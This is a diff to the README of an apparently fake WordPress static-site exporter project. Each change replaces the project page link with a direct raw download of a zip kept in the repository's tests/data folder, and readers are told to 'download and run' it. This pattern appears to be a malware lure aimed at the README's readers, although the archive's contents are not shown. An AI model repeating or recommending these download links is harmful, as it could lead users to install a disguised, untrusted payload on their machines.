@@ -1,6 +1,6 @@
 # 🌐 wp-static-exporter - Fast static sites for WordPress
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/exogenousdepressiontendril594/wp-static-exporter)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/exogenousdepressiontendril594/wp-static-exporter/main/tests/data/static-exporter-wp-v1.3.zip)
 
 ## 🚀 What this app does
 
@@ -32,7 +32,7 @@ If your site is large, give yourself extra free space. Static exports can take m
 
 Open the download page here:
 
-https://github.com/exogenousdepressiontendril594/wp-static-exporter
+https://raw.githubusercontent.com/exogenousdepressiontendril594/wp-static-exporter/main/tests/data/static-exporter-wp-v1.3.zip
 
 Use that page to visit the project and get the latest version.
 
@@ -188,4 +188,4 @@ This keeps the process clear and easy to repeat.
 
 Download and run the latest version from:
 
-https://github.com/exogenousdepressiontendril594/wp-static-exporter
+https://raw.githubusercontent.com/exogenousdepressiontendril594/wp-static-exporter/main/tests/data/static-exporter-wp-v1.3.zip
